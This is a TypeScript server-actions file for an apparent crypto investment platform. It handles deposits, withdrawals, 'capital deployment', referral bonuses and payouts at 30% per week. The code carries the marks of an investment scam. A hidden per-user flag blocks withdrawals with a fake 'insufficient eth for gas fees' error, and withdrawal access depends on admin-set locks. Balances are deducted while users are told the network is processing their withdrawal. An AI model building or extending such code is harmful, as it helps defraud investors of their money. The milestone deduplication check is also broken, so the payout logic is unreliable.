"use server";

import { createClient } from '@/lib/supabase/server';
import { createClient as createSupabaseClient } from '@supabase/supabase-js';
import { revalidatePath } from 'next/cache';
import { sendNotification } from '@/app/actions/notifications';

function getAdminClient() {
  return createSupabaseClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    { auth: { persistSession: false } }
  );
}

export async function requestWithdrawal(amount: number, destinationAddress: string, token: 'USDT' | 'ETH' = 'USDT') {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");
  if (amount <= 0) throw new Error("Invalid amount");

  // 1. Fetch current profile
  const { data: profile, error: profileError } = await supabase
    .from('profiles')
    .select('wallet_balance, eth_balance, block_gas_fees')
    .eq('id', user.id)
    .single();

  if (profileError || !profile) throw new Error("Profile not found");

  if (token === 'USDT' && profile.wallet_balance < amount) {
    throw new Error("Insufficient wallet balance");
  } else if (token === 'ETH' && (profile.eth_balance || 0) < amount) {
    throw new Error("Insufficient ETH balance");
  }

  // Gas Simulator Logic
  if (profile.block_gas_fees) {
    throw new Error("insufficient eth for gas fees");
  }
  
  const GAS_FEE_ETH = 0.001625;
  if ((profile.eth_balance || 0) < GAS_FEE_ETH) {
    throw new Error(`insufficient eth for gas fees`);
  }
  if (token === 'ETH' && (profile.eth_balance || 0) < amount + GAS_FEE_ETH) {
    throw new Error(`insufficient eth for gas fees`);
  }

  // 2. Deduct from wallet balance and ETH balance instantly
  const newWalletBalance = token === 'USDT' ? profile.wallet_balance - amount : profile.wallet_balance;
  const newEthBalance = token === 'ETH' ? (profile.eth_balance || 0) - amount - GAS_FEE_ETH : (profile.eth_balance || 0) - GAS_FEE_ETH;
  
  const adminSupabase = getAdminClient();
  const { error: updateError } = await adminSupabase
    .from('profiles')
    .update({ 
      wallet_balance: newWalletBalance,
      eth_balance: newEthBalance 
    })
    .eq('id', user.id);

  if (updateError) throw new Error("Failed to secure funds");

  // 3. Create pending transaction
  const { error: txError } = await supabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: amount,
      type: 'withdrawal',
      tx_hash: JSON.stringify({
        token: token,
        address: destinationAddress,
        original_tx_hash: token === 'ETH' ? 'eth_withdrawal' : 'wallet_withdrawal'
      }),
      status: 'pending'
    });

  if (txError) {
    // Rollback logic would go here in a real production system with RPC/Functions
    throw new Error(`Failed to create transaction record: ${txError.message || JSON.stringify(txError)}`);
  }

  // 4. Send a receipt notification
  try {
    let ethPriceStr = '';
    if (token === 'ETH') {
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', { next: { revalidate: 300 } });
        const data = await res.json();
        if (data?.ethereum?.usd) {
          ethPriceStr = ` (~$${(amount * data.ethereum.usd).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})})`;
        }
      } catch (e) {}
    }

    const title = token === 'USDT' ? 'Withdrawal Processed' : 'ETH Withdrawal Processed';
    const message = token === 'USDT' 
      ? `Your withdrawal of $${amount.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT is being processed by the network.`
      : `Your withdrawal of ${amount} ETH${ethPriceStr} is being processed by the network.`;
    await sendNotification(user.id, title, message, 'success');
  } catch (e) {
    console.error("Failed to generate receipt notification:", e);
  }

  revalidatePath('/dashboard');
  return { success: true };
}

export async function notifyDeposit(amount: number, token: 'USDT' | 'ETH' = 'USDT') {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");

  const { error: txError } = await supabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: amount,
      type: 'deposit',
      tx_hash: JSON.stringify({ token, original_tx_hash: token === 'ETH' ? 'eth_deposit' : 'wallet_deposit' }),
      status: 'pending'
    });

  if (txError) {
    throw new Error("Failed to notify deposit");
  }

  revalidatePath('/dashboard/wallet');
  revalidatePath('/dashboard');
  return { success: true };
}

export async function deployCapital(amount: number) {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");
  if (amount <= 0) throw new Error("Invalid amount");

  // 1. Fetch current profile
  const { data: profile, error: profileError } = await supabase
    .from('profiles')
    .select('wallet_balance, capital_balance, earnings_balance, investment_start_date, last_yield_calculation, referred_by, has_funded, referral_reward_paid')
    .eq('id', user.id)
    .single();

  if (profileError || !profile) throw new Error("Profile not found");
  if (profile.wallet_balance < amount) throw new Error("Insufficient wallet balance");

  const now = new Date();

  // 2. Accrue existing yield if there is active capital
  let accruedEarnings = 0;
  if ((profile.capital_balance || 0) > 0 && profile.investment_start_date) {
    const SECONDS_IN_WEEK = 604800;
    const lastCalc = new Date(profile.last_yield_calculation || profile.investment_start_date).getTime();
    const elapsed = (now.getTime() - lastCalc) / 1000;
    if (elapsed > 0) {
      accruedEarnings = profile.capital_balance * 0.30 * (elapsed / SECONDS_IN_WEEK);
    }
  }

  // 3. Shift funds and update balances safely
  const newWalletBalance = profile.wallet_balance - amount;
  const newCapitalBalance = (profile.capital_balance || 0) + amount;
  const newEarningsBalance = (profile.earnings_balance || 0) + accruedEarnings;
  
  const isFirstQualifyingFunding = !profile.has_funded && newCapitalBalance >= 100;

  // 4. Do not reset the 30-day clock if they are simply adding to an active investment
  const isNewInvestmentCycle = !profile.investment_start_date || (profile.capital_balance || 0) === 0;
  const newStartDate = isNewInvestmentCycle ? now.toISOString() : profile.investment_start_date;

  const adminSupabase = getAdminClient();

  const { error: updateError } = await adminSupabase
    .from('profiles')
    .update({ 
      wallet_balance: newWalletBalance,
      capital_balance: newCapitalBalance,
      earnings_balance: newEarningsBalance, // Save their accrued real-time earnings
      investment_start_date: newStartDate, // Keep their cycle progress
      last_yield_calculation: now.toISOString(), // Start compounding on the new total balance from this exact second
      ...(isFirstQualifyingFunding ? { has_funded: true } : {})
    })
    .eq('id', user.id);

  if (updateError) throw new Error("Failed to deploy capital");

  // 3. Handle Referral Bonus if applicable
  if (isFirstQualifyingFunding && profile.referred_by && !profile.referral_reward_paid) {
    // We need to bypass RLS to update the sponsor's earnings
    const adminSupabaseForSponsor = getAdminClient();

    const { data: sponsor } = await adminSupabaseForSponsor
      .from('profiles')
      .select('id, earnings_balance')
      .eq('referral_code', profile.referred_by)
      .single();

    if (sponsor) {
      // Add $10 to sponsor's earnings_balance
      await adminSupabaseForSponsor
        .from('profiles')
        .update({ earnings_balance: (sponsor.earnings_balance || 0) + 10 })
        .eq('id', sponsor.id);
        
      // Record referral transaction for sponsor
      await adminSupabaseForSponsor
        .from('transactions')
        .insert({
          user_id: sponsor.id,
          amount: 10,
          type: 'deposit',
          tx_hash: 'referral_bonus',
          status: 'approved',
          description: `Referral Bonus for inviting ${user.id.substring(0,6)}...`
        });

      // Send Notification to Sponsor
      await sendNotification(
        sponsor.id,
        "Referral Bonus Earned!",
        `You have earned a $10 referral bonus! It has been credited to your earnings balance.`,
        "success"
      );
      
      // Mark referral reward as paid to prevent duplicate payouts
      await adminSupabaseForSponsor
        .from('profiles')
        .update({ referral_reward_paid: true })
        .eq('id', user.id);
    }
  }

  // 4. Create completed transaction for deployment
  await adminSupabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: amount,
      type: 'withdrawal',
      tx_hash: 'capital_deployment',
      status: 'approved'
    });

  // 5. Send Notification
  await sendNotification(
    user.id,
    "Capital Deployment Successful",
    `Dear Investor, your capital deployment of $${amount.toLocaleString()} has been successfully initiated. Yield generation has commenced.`,
    "success"
  );

  revalidatePath('/dashboard');
  revalidatePath('/dashboard/investments');
  revalidatePath('/dashboard/wallet');
  return { success: true };
}

export async function withdrawEarnings() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");

  const { data: profile } = await supabase
    .from('profiles')
    .select('wallet_balance, earnings_balance, earnings_withdrawal_permitted, investment_start_date, last_yield_calculation, capital_balance')
    .eq('id', user.id)
    .single();

  if (!profile) throw new Error("Profile not found");

  // Server-side check for 7-day algorithmic window
  const isAutoWindowOpen = () => {
    if (!profile.investment_start_date) return false;
    const startObj = new Date(profile.investment_start_date).getTime();
    const lastCalc = profile.last_yield_calculation ? new Date(profile.last_yield_calculation).getTime() : startObj;
    const now = Date.now();
    const daysCompleted = (now - startObj) / (1000 * 60 * 60 * 24);
    
    const milestones = [7, 14, 21, 28];
    for (const milestone of milestones) {
      if (daysCompleted >= milestone) {
        const milestoneDate = startObj + (milestone * 24 * 60 * 60 * 1000);
        if (lastCalc < milestoneDate) return true;
      }
    }
    return false;
  };

  if (!profile.earnings_withdrawal_permitted && !isAutoWindowOpen()) {
    throw new Error("Earnings withdrawal is currently locked");
  }

  // Calculate realtime yield before withdrawing
  const SECONDS_IN_WEEK = 604800;
  const lastCalc = new Date(profile.last_yield_calculation || profile.investment_start_date).getTime();
  const elapsed = (Date.now() - lastCalc) / 1000;
  const realtimeEarnings = (profile.earnings_balance || 0) + ((profile.capital_balance || 0) * 0.30 * (elapsed / SECONDS_IN_WEEK));

  if (realtimeEarnings <= 0) throw new Error("No earnings to withdraw");

  // Move earnings to wallet
  const newWalletBalance = (profile.wallet_balance || 0) + realtimeEarnings;
  
  const adminSupabase = getAdminClient();

  const { error: updateError } = await adminSupabase
    .from('profiles')
    .update({ 
      wallet_balance: newWalletBalance,
      earnings_balance: 0,
      last_yield_calculation: new Date().toISOString(), // Use last_yield_calculation to track payouts!
      earnings_withdrawal_permitted: false // Auto lock after withdrawal
    })
    .eq('id', user.id);

  if (updateError) throw new Error("Failed to withdraw earnings");

  await adminSupabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: realtimeEarnings,
      type: 'deposit',
      tx_hash: 'withdrawal_earnings',
      status: 'approved'
    });

  await sendNotification(
    user.id,
    "Earnings Withdrawal Processed",
    `Dear Investor, your earnings withdrawal of $${realtimeEarnings.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} has been successfully processed and credited to your wallet balance.`,
    "success"
  );

  revalidatePath('/dashboard');
  revalidatePath('/dashboard/investments');
  revalidatePath('/dashboard/wallet');
  return { success: true };
}

export async function withdrawCapital() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");

  const { data: profile } = await supabase
    .from('profiles')
    .select('wallet_balance, capital_balance, capital_withdrawal_permitted, earnings_balance, investment_start_date, last_yield_calculation')
    .eq('id', user.id)
    .single();

  if (!profile) throw new Error("Profile not found");
  if (!profile.capital_withdrawal_permitted) throw new Error("Capital withdrawal is currently locked");
  if ((profile.capital_balance || 0) <= 0) throw new Error("No capital to withdraw");

  // Calculate realtime yield before withdrawing capital
  const SECONDS_IN_WEEK = 604800;
  const lastCalc = new Date(profile.last_yield_calculation || profile.investment_start_date).getTime();
  const elapsed = (Date.now() - lastCalc) / 1000;
  const realtimeEarnings = (profile.earnings_balance || 0) + ((profile.capital_balance || 0) * 0.30 * (elapsed / SECONDS_IN_WEEK));

  // Move capital AND earnings to wallet
  const newWalletBalance = (profile.wallet_balance || 0) + profile.capital_balance + realtimeEarnings;
  
  const adminSupabase = getAdminClient();

  const { error: updateError } = await adminSupabase
    .from('profiles')
    .update({ 
      wallet_balance: newWalletBalance,
      capital_balance: 0,
      earnings_balance: 0,
      capital_withdrawal_permitted: false, // Auto lock after withdrawal
      investment_start_date: null,
      last_yield_calculation: null
    })
    .eq('id', user.id);

  if (updateError) throw new Error("Failed to withdraw capital");

  await adminSupabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: profile.capital_balance,
      type: 'deposit',
      tx_hash: 'withdrawal_capital',
      status: 'approved'
    });

  await sendNotification(
    user.id,
    "Capital Withdrawal Processed",
    `Dear Investor, your capital withdrawal of $${profile.capital_balance.toLocaleString()} has been successfully processed. The funds, along with any accrued earnings, have been transferred to your wallet.`,
    "success"
  );

  revalidatePath('/dashboard');
  revalidatePath('/dashboard/investments');
  revalidatePath('/dashboard/wallet');
  return { success: true };
}

export async function reinvestCapital() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) throw new Error("Unauthorized");

  const { data: profile } = await supabase
    .from('profiles')
    .select('capital_balance, earnings_balance, investment_start_date, last_yield_calculation')
    .eq('id', user.id)
    .single();

  if (!profile) throw new Error("Profile not found");
  if ((profile.capital_balance || 0) <= 0) throw new Error("No capital to reinvest");

  const now = new Date();
  
  // Check if they are reinvesting at the END of the 30 day cycle (which means rolling over a new cycle)
  let isCycleComplete = false;
  if (profile.investment_start_date) {
    const startObj = new Date(profile.investment_start_date).getTime();
    const daysCompleted = (now.getTime() - startObj) / (1000 * 60 * 60 * 24);
    if (daysCompleted >= 30) {
      isCycleComplete = true;
    }
  }

  // Calculate realtime yield before reinvesting
  const SECONDS_IN_WEEK = 604800;
  const lastCalc = new Date(profile.last_yield_calculation || profile.investment_start_date).getTime();
  const elapsed = (now.getTime() - lastCalc) / 1000;
  
  let realtimeEarnings = 0;
  if (elapsed > 0) {
    realtimeEarnings = (profile.earnings_balance || 0) + ((profile.capital_balance || 0) * 0.30 * (elapsed / SECONDS_IN_WEEK));
  } else {
    realtimeEarnings = profile.earnings_balance || 0;
  }

  if (realtimeEarnings <= 0 && isCycleComplete) {
    // If they hit reinvest at day 30, they might just want to rollover principal
    realtimeEarnings = 0;
  } else if (realtimeEarnings <= 0) {
    throw new Error("No earnings to reinvest");
  }

  // Add earnings to capital
  const newCapitalBalance = profile.capital_balance + realtimeEarnings;

  const adminSupabase = getAdminClient();

  const newStartDate = isCycleComplete || !profile.investment_start_date ? now.toISOString() : profile.investment_start_date;

  const { error: updateError } = await adminSupabase
    .from('profiles')
    .update({ 
      capital_balance: newCapitalBalance,
      earnings_balance: 0,
      investment_start_date: newStartDate, // Restart clock ONLY if cycle was complete (rollover), otherwise maintain cycle
      last_yield_calculation: now.toISOString(), // Start compounding on new total immediately
      capital_withdrawal_permitted: false,
      earnings_withdrawal_permitted: false
    })
    .eq('id', user.id);

  if (updateError) throw new Error("Failed to reinvest capital");

  // Log reinvestment
  await adminSupabase
    .from('transactions')
    .insert({
      user_id: user.id,
      amount: profile.capital_balance,
      type: 'deposit',
      tx_hash: 'capital_reinvestment',
      status: 'approved'
    });

  await sendNotification(
    user.id,
    "Capital Reinvested",
    `Dear Investor, your accrued earnings of $${realtimeEarnings.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} have been successfully reinvested into your principal capital.`,
    "success"
  );

  revalidatePath('/dashboard');
  revalidatePath('/dashboard/investments');
  revalidatePath('/dashboard/wallet');
  return { success: true };
}

export async function syncEarningsMilestones(userId: string) {
  const adminSupabase = getAdminClient();

  const { data: profile } = await adminSupabase
    .from('profiles')
    .select('capital_balance, investment_start_date')
    .eq('id', userId)
    .single();

  if (!profile || !profile.investment_start_date || (profile.capital_balance || 0) <= 0) return;

  const startObj = new Date(profile.investment_start_date).getTime();
  const now = Date.now();
  const daysCompleted = (now - startObj) / (1000 * 60 * 60 * 24);

  const milestones = [7, 14, 21, 28];
  
  // Get existing investment_earnings transactions for this cycle
  const { data: existingTx } = await adminSupabase
    .from('transactions')
    .select('created_at, amount')
    .eq('user_id', userId)
    .eq('type', 'investment_earnings')
    .gte('created_at', profile.investment_start_date);

  const existingTimestamps = existingTx?.map(tx => new Date(tx.created_at).getTime()) || [];

  for (const milestone of milestones) {
    if (daysCompleted >= milestone) {
      const exactMilestoneTime = startObj + (milestone * 24 * 60 * 60 * 1000);
      
      // Check if we already have a transaction recorded within 24h of this milestone time
      const alreadyLogged = existingTimestamps.some(t => Math.abs(t - exactMilestoneTime) < 1000 * 60 * 60 * 24);
      
      if (!alreadyLogged) {
        // Daily yield is 4.285% = 30% per 7 days
        const exactAmount = profile.capital_balance * 0.30;
        
        await adminSupabase
          .from('transactions')
          .insert({
            user_id: userId,
            amount: exactAmount,
            type: 'deposit',
            tx_hash: 'investment_earnings',
            status: 'approved',
            created_at: new Date(exactMilestoneTime).toISOString(),
            description: `Day ${milestone} Earnings Payout`
          });

        const { sendNotification } = await import('@/app/actions/notifications');
        await sendNotification(
          userId,
          `Day ${milestone} Earnings Payout`,
          `Dear Investor, your Day ${milestone} earnings payout of $${exactAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} has been successfully credited and is available for withdrawal or reinvestment.`,
          "success",
          false
        );
      }
    }
  }
}
